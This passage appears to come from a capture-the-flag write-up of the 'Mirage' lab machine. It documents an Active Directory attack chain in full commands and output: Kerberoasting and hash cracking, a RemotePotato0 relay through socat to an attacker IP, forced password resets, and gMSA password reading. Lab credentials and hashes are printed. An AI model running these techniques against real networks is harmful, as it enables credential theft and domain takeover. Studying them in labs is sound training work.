+                         Memory: 0 B
+                        Streams: 1
+                      Consumers: 0
+
+Account Limits:
+
+            Max Message Payload: 1.0 MiB
+
+  Tier: Default:
+
+      Configuration Requirements:
+
+        Stream Requires Max Bytes Set: false
+         Consumer Maximum Ack Pending: Unlimited
+
+      Stream Resource Usage Limits:
+
+                               Memory: 0 B of Unlimited 
+                    Memory Per Stream: Unlimited
+                              Storage: 570 B of Unlimited (1.0 MiB reserved)
+                   Storage Per Stream: Unlimited
+                              Streams: 1 of Unlimited
+                            Consumers: Unlimited</code></pre><p>This is just general account and service info</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ~/go/bin/nats stream list --context mirage 
+╭───────────────────────────────────────────────────────────────────────────────────╮
+│                                      Streams                                      │
+├───────────┬─────────────┬─────────────────────┬──────────┬───────┬────────────────┤
+│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message   │
+├───────────┼─────────────┼─────────────────────┼──────────┼───────┼────────────────┤
+│ auth_logs │             │ 2025-05-05 08:18:19 │ 5        │ 570 B │ 1y158d16h30m0s │
+╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴────────────────╯</code></pre><p>There is a previous stream which i should be able to read</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ~/go/bin/nats stream view auth_logs --context mirage
+[1] Subject: logs.auth Received: 2025-05-05 08:18:56
+{&quot;user&quot;:&quot;david.jjackson&quot;,&quot;password&quot;:&quot;pN8kQmn6b86!1234@&quot;,&quot;ip&quot;:&quot;10.10.10.20&quot;}
+
+
+[2] Subject: logs.auth Received: 2025-05-05 08:19:24
+{&quot;user&quot;:&quot;david.jjackson&quot;,&quot;password&quot;:&quot;pN8kQmn6b86!1234@&quot;,&quot;ip&quot;:&quot;10.10.10.20&quot;}
+
+
+[3] Subject: logs.auth Received: 2025-05-05 08:19:25
+{&quot;user&quot;:&quot;david.jjackson&quot;,&quot;password&quot;:&quot;pN8kQmn6b86!1234@&quot;,&quot;ip&quot;:&quot;10.10.10.20&quot;}
+
+
+[4] Subject: logs.auth Received: 2025-05-05 08:19:26
+{&quot;user&quot;:&quot;david.jjackson&quot;,&quot;password&quot;:&quot;pN8kQmn6b86!1234@&quot;,&quot;ip&quot;:&quot;10.10.10.20&quot;}
+
+
+[5] Subject: logs.auth Received: 2025-05-05 08:19:27
+{&quot;user&quot;:&quot;david.jjackson&quot;,&quot;password&quot;:&quot;pN8kQmn6b86!1234@&quot;,&quot;ip&quot;:&quot;10.10.10.20&quot;}
+
+
+17:50:57 Reached apparent end of data</code></pre><p>I have found more credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">david.jjackson:pN8kQmn6b86!1234@</code></pre><p>Ill try these on the domain</p><h2>Initial access on the domain</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python"> ❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;david.jjackson&#39; -p &#39;pN8kQmn6b86!1234@&#39; -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@</code></pre><p>The credentials get me access on the domain</p><h2>Kerberoasting leads to user compromise of <code>nathan.aadam</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc ldap dc01.mirage.htb -u &#39;david.jjackson&#39; -p &#39;pN8kQmn6b86!1234@&#39; -k --kerberoasting kerb.hash
+LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
+LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
+LDAP        dc01.mirage.htb 389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        dc01.mirage.htb 389    DC01             [*] Total of records returned 1
+LDAP        dc01.mirage.htb 389    DC01             [*] sAMAccountName: nathan.aadam, memberOf: [&#39;CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb&#39;, &#39;CN=IT_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb&#39;], pwdLastSet: 2025-06-23 22:18:18.584667, lastLogon: 2025-07-04 21:01:43.511763
+LDAP        dc01.mirage.htb 389    DC01             $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb\nathan.aadam*$b02d96bed6193309f86ae7a663257266$1411cb7dc46e14929866270df6bc2a99dd3bd1f09ee4d8a48a63eb5dab3060163f289f66742eedf5d42ea7dbf1a83b2ebeff02319da421d8636f852c4527c1f6978758009560011503348e8053537e0319de8ec1156d03ea438dce9a817993bc094cf0d6185f4ee5910b3ca24da3c69f7008557641a63657a685d5f634522a26d54150a21eedca0c52e44bfbe7972b551eadb19d8b19c417914cdad2e76ee8801c04befe4f5aff5745fcbab3a9dc04f1fa6b797dd70c790d92c29f2d53858ef29dd5d1011021ee99037e4993c569217eee1721a49ee3dce19d494efed872f1dee8fbea8fe3a3f3d94d288120269b44675dca6a36776d5dcd4193fb6f9fad85ec12690331daf9d711bafaf0aeaf00d6ae89509794baf517971815ea4de2f4c17c2067866eefeb0f8117005d51159d6e9a900af327aa93313a1322b1848281764ee523be5157cf844e46fcd7d847ec04308bfabce84121f280f5cc2f0f4b70d47fe9b09501e2e0a4ead7571fd5c76bb9acd8acb981eca50fa5cd4d6b3a6137aa159c9fcd3ac9cccdfd3ce4d158fe3a2dc1dac690e0bf34fe8f7ad1f46f9601f55c0701c5574a46aecfd91c0bba1be2d2e8c2de9509853cb5e630ba8375a8dfde8b94fd629e40e31731a4b5b642ae5d8173ecbece64d0d87ba7bde1939b6798b1773bd37795f3ae4e13708e1987a1cc72d1b1b8397e34a8e5041bf3b49b3e702ee0a87eba54f4dfd4672d6b0f64faa9a1aa6f744100a333a7659ed7be651b93d71b952c8794897849d5540edfc635722901666d904987d41533866e985304bf89cca3fef70625266ab99de05b57d7ca46b6b2fe023fa29ebcb255cb85055f82a80f97db617d71d9e84dcacf8befdcaae90495c7529e14a0a253d465399bc9a5e9aa3fdd3ceec4f9db0ed8321a00c6ba12af0c8d90848ccf761437b545b49f307c54cb8e5c1d5b6e2c02e355949b85a259b5e8c4f61f11e81aaf55803f18b88f3a64e69af59d416546bae5889eef897ba1f46364c556534fbeb910ba1d51cd5c36c7dbc4aee03f279348c84b74814f4d50d85b020c60d2847dd903dad2ad32fcdb43e7a6ce8bf665554184d6e335606114b23111ef77be658eeb260fc4e5eaa271831e839818b84e871d6ecc52f78f224f14e82e5aa4baf85e896702cf6e3f7fb5a888b7ac083e90d3ca4b9977aa366db4f528120969d5205b682a5a5a1ac90a868c05efffd7cd87427024c578d3028ae52faec66f70d409198fe4f72f9953d863ce9140d4f655791d1a14da599244a51e910ab6f5a9ca8993e88b5778b43866c9be35116a45c689f47504895be6b2ca87c0f2ada1b96b1a4fa360bbca46811578fff890081e630e23f66bda37a3849677676ea76d629e2bbc131d88a0885d1090c3b60790d4ba5e9b2bd2e69254240f1c489e5f8f2c19794c9d2e2b698ee800c3c6218ac844d3c8a9f5d13942f34f76f110191800660a6f0de7b1b79ae846e3f8b5a53576d7457021e86864dc8049f3239fdfc73cb3c17fa194e7f2ea0013ed07a3187e2920bfa3904235691e4e6abe75f6658887a323c936ab5257534ecec6db5cc9d72207fe0df8201d</code></pre><p>There is a kerberoastable user, but will the hash crack?</p><p>Its e type 23 which means RC4, so it shouldnt take long to run through the wordlist</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ hashcat kerb.hash /usr/share/wordlists/rockyou.txt
+
+$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb\nathan.aadam*$b02d96bed6193309f86ae7a663257266$1411cb7dc46e14929866270df6bc2a99dd3bd1f09ee4d8a48a63eb5dab3060163f289f66742eedf5d42ea7dbf1a83b2ebeff02319da421d8636f852c4527c1f6978758009560011503348e8053537e0319de8ec1156d03ea438dce9a817993bc094cf0d6185f4ee5910b3ca24da3c69f7008557641a63657a685d5f634522a26d54150a21eedca0c52e44bfbe7972b551eadb19d8b19c417914cdad2e76ee8801c04befe4f5aff5745fcbab3a9dc04f1fa6b797dd70c790d92c29f2d53858ef29dd5d1011021ee99037e4993c569217eee1721a49ee3dce19d494efed872f1dee8fbea8fe3a3f3d94d288120269b44675dca6a36776d5dcd4193fb6f9fad85ec12690331daf9d711bafaf0aeaf00d6ae89509794baf517971815ea4de2f4c17c2067866eefeb0f8117005d51159d6e9a900af327aa93313a1322b1848281764ee523be5157cf844e46fcd7d847ec04308bfabce84121f280f5cc2f0f4b70d47fe9b09501e2e0a4ead7571fd5c76bb9acd8acb981eca50fa5cd4d6b3a6137aa159c9fcd3ac9cccdfd3ce4d158fe3a2dc1dac690e0bf34fe8f7ad1f46f9601f55c0701c5574a46aecfd91c0bba1be2d2e8c2de9509853cb5e630ba8375a8dfde8b94fd629e40e31731a4b5b642ae5d8173ecbece64d0d87ba7bde1939b6798b1773bd37795f3ae4e13708e1987a1cc72d1b1b8397e34a8e5041bf3b49b3e702ee0a87eba54f4dfd4672d6b0f64faa9a1aa6f744100a333a7659ed7be651b93d71b952c8794897849d5540edfc635722901666d904987d41533866e985304bf89cca3fef70625266ab99de05b57d7ca46b6b2fe023fa29ebcb255cb85055f82a80f97db617d71d9e84dcacf8befdcaae90495c7529e14a0a253d465399bc9a5e9aa3fdd3ceec4f9db0ed8321a00c6ba12af0c8d90848ccf761437b545b49f307c54cb8e5c1d5b6e2c02e355949b85a259b5e8c4f61f11e81aaf55803f18b88f3a64e69af59d416546bae5889eef897ba1f46364c556534fbeb910ba1d51cd5c36c7dbc4aee03f279348c84b74814f4d50d85b020c60d2847dd903dad2ad32fcdb43e7a6ce8bf665554184d6e335606114b23111ef77be658eeb260fc4e5eaa271831e839818b84e871d6ecc52f78f224f14e82e5aa4baf85e896702cf6e3f7fb5a888b7ac083e90d3ca4b9977aa366db4f528120969d5205b682a5a5a1ac90a868c05efffd7cd87427024c578d3028ae52faec66f70d409198fe4f72f9953d863ce9140d4f655791d1a14da599244a51e910ab6f5a9ca8993e88b5778b43866c9be35116a45c689f47504895be6b2ca87c0f2ada1b96b1a4fa360bbca46811578fff890081e630e23f66bda37a3849677676ea76d629e2bbc131d88a0885d1090c3b60790d4ba5e9b2bd2e69254240f1c489e5f8f2c19794c9d2e2b698ee800c3c6218ac844d3c8a9f5d13942f34f76f110191800660a6f0de7b1b79ae846e3f8b5a53576d7457021e86864dc8049f3239fdfc73cb3c17fa194e7f2ea0013ed07a3187e2920bfa3904235691e4e6abe75f6658887a323c936ab5257534ecec6db5cc9d72207fe0df8201d:3edc#EDC3</code></pre><p>The hash cracked!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;nathan.aadam&#39; -p &#39;3edc#EDC3&#39; -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3</code></pre><p>This user is now compromised!</p><h2>Domain Enumeration</h2><p>Ill start to enumerate the domain more at this point</p><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;nathan.aadam&#39; -p &#39;3edc#EDC3&#39; -k --shares
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3 
+SMB         dc01.mirage.htb 445    dc01             [*] Enumerated shares
+SMB         dc01.mirage.htb 445    dc01             Share           Permissions     Remark
+SMB         dc01.mirage.htb 445    dc01             -----           -----------     ------
+SMB         dc01.mirage.htb 445    dc01             ADMIN$                          Remote Admin
+SMB         dc01.mirage.htb 445    dc01             C$                              Default share
+SMB         dc01.mirage.htb 445    dc01             IPC$            READ            Remote IPC
+SMB         dc01.mirage.htb 445    dc01             NETLOGON        READ            Logon server share 
+SMB         dc01.mirage.htb 445    dc01             SYSVOL          READ            Logon server share</code></pre><p>Just default shares</p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;nathan.aadam&#39; -p &#39;3edc#EDC3&#39; -k --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+Dev_Account_A
+Dev_Account_B
+david.jjackson
+javier.mmarshall
+mark.bbond
+nathan.aadam
+Mirage-Service$
+svc_mirage</code></pre><p>Ill use <code>--rid-brute</code> to get users, this also pulls machine accounts so in my personal opinion it works better than <code>--users</code> or <code>--users-export</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;nathan.aadam&#39; -p &#39;3edc#EDC3&#39; -k --users
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3 
+SMB         dc01.mirage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         dc01.mirage.htb 445    dc01             Administrator                 2025-06-23 21:18:18 0       Built-in account for administering the computer/domain 
+SMB         dc01.mirage.htb 445    dc01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         dc01.mirage.htb 445    dc01             krbtgt                        2025-05-01 07:42:23 0       Key Distribution Center Service Account 
+SMB         dc01.mirage.htb 445    dc01             Dev_Account_A                 2025-05-27 14:05:12 0        
+SMB         dc01.mirage.htb 445    dc01             Dev_Account_B                 2025-05-02 08:28:11 0        
+SMB         dc01.mirage.htb 445    dc01             david.jjackson                2025-05-02 08:29:50 0        
+SMB         dc01.mirage.htb 445    dc01             javier.mmarshall              2025-05-25 18:44:43 0       Contoso Contractors 
+SMB         dc01.mirage.htb 445    dc01             mark.bbond                    2025-06-23 21:18:18 0        
+SMB         dc01.mirage.htb 445    dc01             nathan.aadam                  2025-06-23 21:18:18 0        
+SMB         dc01.mirage.htb 445    dc01             svc_mirage                    2025-05-22 20:37:45 0       Old service account migrated by contractors 
+SMB         dc01.mirage.htb 445    dc01             [*] Enumerated 10 local users: MIRAGE</code></pre><p>I also however think it is always worth running <code>--users</code> since it also gets user account descriptions, which can sometimes store passwords or just something of use</p><h3>Password policy</h3><p>Password reuse is common, so before spraying the same account with loads of passwords ensure the policy allows for it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;nathan.aadam&#39; -p &#39;3edc#EDC3&#39; -k --pass-pol
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3 
+SMB         dc01.mirage.htb 445    dc01             [+] Dumping password info for domain: MIRAGE
+SMB         dc01.mirage.htb 445    dc01             Minimum password length: 7
+SMB         dc01.mirage.htb 445    dc01             Password history length: 24
+SMB         dc01.mirage.htb 445    dc01             Maximum password age: 41 days 23 hours 53 minutes 
+SMB         dc01.mirage.htb 445    dc01             
+SMB         dc01.mirage.htb 445    dc01             Password Complexity Flags: 001001
+SMB         dc01.mirage.htb 445    dc01                 Domain Refuse Password Change: 0
+SMB         dc01.mirage.htb 445    dc01                 Domain Password Store Cleartext: 0
+SMB         dc01.mirage.htb 445    dc01                 Domain Password Lockout Admins: 1
+SMB         dc01.mirage.htb 445    dc01                 Domain Password No Clear Change: 0
+SMB         dc01.mirage.htb 445    dc01                 Domain Password No Anon Change: 0
+SMB         dc01.mirage.htb 445    dc01                 Domain Password Complex: 1
+SMB         dc01.mirage.htb 445    dc01             
+SMB         dc01.mirage.htb 445    dc01             Minimum password age: 1 day 4 minutes 
+SMB         dc01.mirage.htb 445    dc01             Reset Account Lockout Counter: 1 minute 
+SMB         dc01.mirage.htb 445    dc01             Locked Account Duration: 1 minute 
+SMB         dc01.mirage.htb 445    dc01             Account Lockout Threshold: 10
+SMB         dc01.mirage.htb 445    dc01             Forced Log off Time: Not Set</code></pre><p>The lockout threshold is set to 10, which means after 10 failed auth attempts on one account will cause a lockout</p><p>Both passwords found for both domain users dont work for any other domain user</p><h3>Bloodhound enumeration</h3><p><img src="images/mirage/pasted-image-20261010181557.webp" alt="Screenshot" loading="lazy" /></p><p>The user <code>nathan.aadam</code> is part of remote management users group, and also two other interesting groups</p><h2>NATS server config</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Program Files\Nats-Server&gt; type nats-server.conf
+listen: &#39;0.0.0.0:4222&#39;
+
+jetstream: {
+  store_dir: &#39;C:\Program Files\Nats-Server\tmp&#39;
+}
+
+accounts: {
+  &#39;$SYS&#39;: {
+    users: [
+      { user: &#39;sysadmin&#39;, password: &#39;bb5M0k5XWIGD&#39; } 
+    ]
+  },
+  
+  &#39;dev&#39;: {
+    jetstream: true,
+    users: [
+      { user: &#39;Dev_Account_A&#39;, password: &#39;hx5h7F5554fP@1337!&#39; }, 
+      { user: &#39;Dev_Account_B&#39;, password: &#39;tvPFGAzdsJfHzbRJ&#39; }
+    ]
+  }
+}
+evil-winrm-py PS C:\Program Files\Nats-Server&gt;</code></pre><p>Found some passwords</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bb5M0k5XWIGD
+tvPFGAzdsJfHzbRJ</code></pre><p>The other one is a password for a previously compromised account <code>dev_account_a</code></p><p>Neither of these passwords work on the domain</p><p>These password dont look useful at the moment</p><h2>Sharphound enumeration</h2><p><img src="images/mirage/pasted-image-20261012180047.webp" alt="Screenshot" loading="lazy" /></p><p>After getting remote access, i always like running sharphound since it tends to be more accurate and show more info</p><p>In this case theres another user with a session on the domain controller</p><p>To exploit this ill try remote potato</p><h2>Remote Potato leads to user compromise</h2><p><a href="https://github.com/antonioCoco/RemotePotato0" target="_blank" rel="noreferrer">https://github.com/antonioCoco/RemotePotato0</a></p><p>Ill install the newest release off github</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; upload RemotePotato0.exe .
+Uploading /home/kali/htb/mirage/RemotePotato0.exe: 192kB [00:00, 534kB/s]                                    
+[+] File uploaded successfully as: C:\Temp\RemotePotato0.exe
+evil-winrm-py PS C:\Temp&gt;</code></pre><p>Then ill upload it to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.232.163:9001</code></pre><p>Ill then start socat on my machine using the target IP and a random port</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.61 -p 9001</code></pre><p>Ill then run this on the target using the remote potato binary and set the port i chose and my IP address</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.61 -p 9001
+[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9001
+[*] Example Network redirector: 
+	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9001
+[*] Starting the RPC server to capture the credentials hash from the user authentication!!
+[*] RPC relay server listening on port 9997 ...
+[*] Spawning COM object in the session: 1
+[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+[*] Starting RogueOxidResolver RPC Server listening on port 9001 ... 
+[*] IStoragetrigger written: 104 bytes
+[*] ServerAlive2 RPC Call
+[*] ResolveOxid2 RPC call
+[+] Received the relayed authentication on the RPC relay server on port 9997
+[*] Connected to RPC Server 127.0.0.1 on port 9001
+[+] User hash stolen!
+
+NTLMv2 Client	: DC01
+NTLMv2 Username	: MIRAGE\mark.bbond
+NTLMv2 Hash	: mark.bbond::MIRAGE:e5e9025a2dc59132:51781a6c2c43dfd18c5e02823139aa87:0101000000000000c87cf4b3a65add0101240c15d04d81cc0000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800c87cf4b3a65add010600040006000000080030003000000000000000010000000020000061ff03ee6bcccb4f55a747e7d85db6de047a3e0276997935f88b88ce38a4498f0a00100000000000000000000000000000000000090000000000000000000000
+
+evil-winrm-py PS C:\Temp&gt;</code></pre><p>Then a few seconds later i get a hash for the user <code>mark.bbond</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat &#39;&lt;hash&gt;&#39; /usr/share/wordlists/rockyou.txt
+
+MARK.BBOND::MIRAGE:e5e9025a2dc59132:51781a6c2c43dfd18c5e02823139aa87:0101000000000000c87cf4b3a65add0101240c15d04d81cc0000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800c87cf4b3a65add010600040006000000080030003000000000000000010000000020000061ff03ee6bcccb4f55a747e7d85db6de047a3e0276997935f88b88ce38a4498f0a00100000000000000000000000000000000000090000000000000000000000:1day@atime</code></pre><p>The hash cracked</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u mark.bbond -p &#39;1day@atime&#39; -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime</code></pre><p>This user is now compromised</p><h2>Enumeration of <code>mark.bbond</code></h2><p><img src="images/mirage/pasted-image-20261012181119.webp" alt="Screenshot" loading="lazy" /></p><p>This user has the ability to change the password of <code>javier.mmarshall</code></p><h2>Compromising <code>javier.mmarshall</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u &#39;mark.bbond&#39; -p &#39;1day@atime&#39; -k set password &#39;javier.mmarshall&#39; &#39;Password123!&#39;
+Clock skew detected. Adjusting local time by 7:00:00.183961. Retrying operation.
+[+] Password changed successfully!</code></pre><p>This changed the users password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u javier.mmarshall -p &#39;Password123!&#39; -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\javier.mmarshall:Password123! KDC_ERR_CLIENT_REVOKED</code></pre><p>So it looks as if it worked, but there is something stopping me from authenticating</p><p>After checking <code>get writable</code> in bloodyAD as <code>mark.bbond</code> i see the account is disabled</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u &#39;mark.bbond&#39; -p &#39;1day@atime&#39; -k get writable --detail
+
+distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
+logonHours: WRITE
+userAccountControl: WRITE</code></pre><p>But however i do have access to modify his UAC, so i should be able to re-enable the account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u &#39;mark.bbond&#39; -p &#39;1day@atime&#39; -k remove uac &#39;javier.mmarshall&#39; -f ACCOUNTDISABLE
+Clock skew detected. Adjusting local time by 7:00:00.454367. Retrying operation.
+[+] [&#39;ACCOUNTDISABLE&#39;] property flags removed from javier.mmarshall&#39;s userAccountControl</code></pre><p>This has re enable the account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u &#39;mark.bbond&#39; -p &#39;1day@atime&#39; -k set object &#39;javier.mmarshall&#39; logonhours -v &#39;////////////////////////////&#39; --b64
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
+Clock skew detected. Adjusting local time by 7:00:00.332154. Retrying operation.
+[+] javier.mmarshall&#39;s logonHours has been updated</code></pre><p>This also sets his account to full logon hours</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;javier.mmarshall&#39; -p &#39;Password123!&#39; -k --generate-tgt javier
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\javier.mmarshall:Password123! 
+SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: javier.ccache
+SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=javier.ccache</code></pre><p>Then i can auth and get a TGT becuase i think there is a cleanup script thats resetting the account to change it back</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ export KRB5CCNAME=javier.ccache
+
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb --use-kcache          
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] MIRAGE.HTB\javier.mmarshall from ccache</code></pre><p>Now i can auth using this TGT</p><h2>Compromising <code>mirage-service$</code></h2><p><img src="images/mirage/pasted-image-20261012182741.webp" alt="Screenshot" loading="lazy" /></p><p>I have the ability to the gMSA password of this account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc ldap dc01.mirage.htb --use-kcache --gmsa
+LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:MIRAGE.HTB) (signing:None) (channel binding:Never) (NTLM:False)
+LDAP        dc01.mirage.htb 389    DC01             [+] MIRAGE.HTB\javier.mmarshall from ccache 
+LDAP        dc01.mirage.htb 389    DC01             [*] Getting GMSA Passwords
+LDAP        dc01.mirage.htb 389    DC01             Account: Mirage-Service$      NTLM: 5f62e853f3876d511ff8628cb59e757c     PrincipalsAllowedToReadPassword: javier.mmarshall</code></pre><p>I can read this value using nxc</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;mirage-service$&#39; -H &#39;5f62e853f3876d511ff8628cb59e757c&#39; -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mirage-service$:5f62e853f3876d511ff8628cb59e757c</code></pre><p>This user is now compromised</p><h2>Enumeration as <code>mirage-service$</code></h2><p><img src="images/mirage/pasted-image-20261012184212.webp" alt="Screenshot" loading="lazy" /></p><p>This is interesting, especially since the user <code>mark.bbond</code> is already compromised</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -k get writable --detail
+
+distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
+manager: WRITE
+mail: WRITE
+msDS-HABSeniorityIndex: WRITE
+msDS-PhoneticDisplayName: WRITE
+msDS-PhoneticCompanyName: WRITE
+msDS-PhoneticDepartment: WRITE
+msDS-PhoneticLastName: WRITE
+msDS-PhoneticFirstName: WRITE
+msDS-SourceObjectDN: WRITE
+msDS-AllowedToDelegateTo: WRITE
+altSecurityIdentities: WRITE
+servicePrincipalName: WRITE
+userPrincipalName: WRITE
+legacyExchangeDN: WRITE
+otherMailbox: WRITE
+showInAddressBook: WRITE
+systemFlags: WRITE
+division: WRITE
+objectGUID: WRITE
+name: WRITE
+displayNamePrintable: WRITE
+proxyAddresses: WRITE
+company: WRITE
+department: WRITE
+co: WRITE
+dn: WRITE
+initials: WRITE
+givenName: WRITE
+description: WRITE
+title: WRITE
+ou: WRITE
+o: WRITE
+sn: WRITE
+objectCategory: WRITE
+cn: WRITE
